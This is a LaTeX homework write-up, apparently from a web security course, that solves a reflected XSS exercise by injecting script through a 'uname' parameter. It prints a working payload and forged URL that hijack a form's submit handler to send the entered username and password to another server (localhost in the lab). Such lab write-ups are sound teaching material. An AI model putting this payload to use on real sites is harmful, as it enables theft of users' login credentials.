@@ -1,0 +1,137 @@
+\documentclass[12pt]{scrartcl}
+
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern}
+\usepackage{graphicx}
+%\usepackage[pdftex,hyperref,dvipsnames]{xcolor}
+\usepackage{listings}
+\usepackage[a4paper,lmargin={2cm},rmargin={2cm},tmargin={3.5cm},bmargin = {2.5cm},headheight = {4cm}]{geometry}
+\usepackage{amsmath,amssymb,amstext,amsthm}
+% \usepackage[lined,algonl,boxed]{algorithm2e} 
+%\usepackage{algpseudocode}
+\usepackage{tikz}
+\usepackage{pgfplots}
+\usepackage{url}
+\usepackage{tcolorbox}
+\usepackage[inline]{enumitem}
+\usepackage[headsepline]{scrlayer-scrpage} 
+\usepackage{float}
+\usepackage{hyperref}
+
+\usepackage[scale=0.55, lineVdist=1em]{secstack}
+\pagestyle{scrheadings} 
+\usetikzlibrary{automata,positioning}
+\graphicspath{ {./images/} }
+
+\usepgfplotslibrary{external}
+%\tikzexternalize
+\pgfplotsset{width=10cm,compat=1.9}
+\pgfplotsset{every axis/.style={
+    axis line style = thick,
+    grid = both,
+    tick pos = left,
+    tick align = outside,
+    tick style = {thick,black},
+    fill = blue,
+	line width = 2pt,
+}}
+
+\lstset{
+  basicstyle=\ttfamily\small,
+  numbers=left,
+  numberstyle=\tiny,
+  stepnumber=1,
+  numbersep=8pt,
+  frame=single,
+  breaklines=true,
+  columns=fullflexible
+}
+
+\lstset{
+  language=C,
+  basicstyle=\ttfamily\small,
+  keywordstyle=\color{blue},
+  commentstyle=\color{gray},
+  stringstyle=\color{green!60!black},
+  numbers=left,
+  numberstyle=\tiny,
+  stepnumber=1,
+  numbersep=8pt,
+  frame=single,
+  breaklines=true,
+  columns=fullflexible
+}
+
+\lstset{
+    escapeinside={(*@}{@*)}
+}
+
+\renewcommand{\theenumi}{(\alph{enumi})}
+\renewcommand{\labelenumi}{\text{\theenumi}}
+\renewcommand{\labelenumii}{(\roman{enumii})} 
+
+\ohead{Marvin Simon (3883376)\\
+       Jan Theil (3794698)}
+
+\ihead{System and Web Security}
+
+\newcounter{exnum}
+\newcommand{\exercise}[1]{\section*{Problem \theexnum\stepcounter{exnum}: #1}}
+
+\begin{document}
+
+\setcounter{exnum}{2}
+\exercise{Stealing Form Data With XSS}
+
+First, let us have a look at the problematic line in the python code:
+\begin{lstlisting}
+Username: <input type="text" name="uname" id="uname" value="{uname}"><br>
+\end{lstlisting}
+With the GET parameter \textit{uname} we can inject HTML (and therefore JavaScript) code by crafting a specific URL (reflected XSS).
+
+We did this in the following steps (for readability we will not repeatedly print the IP to localhost, instead the placeholder \texttt{...} is used):
+\begin{enumerate}[label=\arabic*.]
+  \item To inject a \texttt{<script>}-block, we first need to escape the \texttt{<input>}-tag where the value of the parameter is inputted.
+        This is done by starting with \texttt{...?uname=">}. This gives us:
+        \begin{lstlisting}
+Username: <input type="text" name="uname" id="uname" value="(*@\textcolor{red}{">}@*)"><br>
+        \end{lstlisting}
+  \item Now we can inject the \texttt{<script>}-block. The goal is to overwrite the \texttt{submit} function of the form and send the
+        inputted values to some other server (in our case just \textit{localhost:8082} but it can be arbitrary). For this we used
+        \texttt{document.forms[0].onsubmit = function() \{...\}}. Within this function block the context of \texttt{this} is the form itself.
+        Hence, we can use \texttt{this.<field>.value} to obtain the values from the form, forge a request URL with these values and open 
+        a new window with \texttt{window.open} to send these values to our server. This is done by the following JS code:
+        \begin{lstlisting}
+<script>
+  document.forms[0].onsubmit = function() {
+  let req = `http://localhost:8082?name=${this.uname.value}&pass=${this.password.value}`;
+  window.open(req);}
+</script>
+        \end{lstlisting}
+  \item Now we have something like this:
+  \begin{lstlisting}
+Username: <input type="text" name="uname" id="uname" value="(*@\textcolor{red}{"><script>...</script>}@*)"><br>
+  \end{lstlisting}
+  The final thing left to do is to remove all visual indicators of document manipulation. We have done this by ending the \texttt{uname}
+  parameter with \texttt{<br style="display:none} to get rid of the dangling \texttt{>} which is breaking our document structure. Therefor,
+  we get this:
+  \begin{lstlisting}
+    Username: <input type="text" name="uname" id="uname"
+    value="(*@\textcolor{red}{\ttfamily"><script>...</script><br style="display:none>}@*)"><br>
+  \end{lstlisting}
+\end{enumerate}
+
+The final forged URL is
+\url{http://localhost:8081/?uname="><script>document.forms[0].%20onsubmit=function()%20{%20let%20req%20=%20`http://localhost:8082?name=${this.uname.value}%26pass=${this.password.value}`;%20window.open(req);}</script><br%20style="display:none}.
+Notice how we have also used the appropriate HTML encodings for special symbols.
+
+% http://localhost:8081/?uname=">
+% <script>
+% document.forms[0].onsubmit = function() {
+%   let req = `http://localhost:8082?name=${this.uname.value}%26pass=${this.password.value}`;
+%   window.open(req);}
+% </script>
+% <br style="display:none
+
+\end{document}
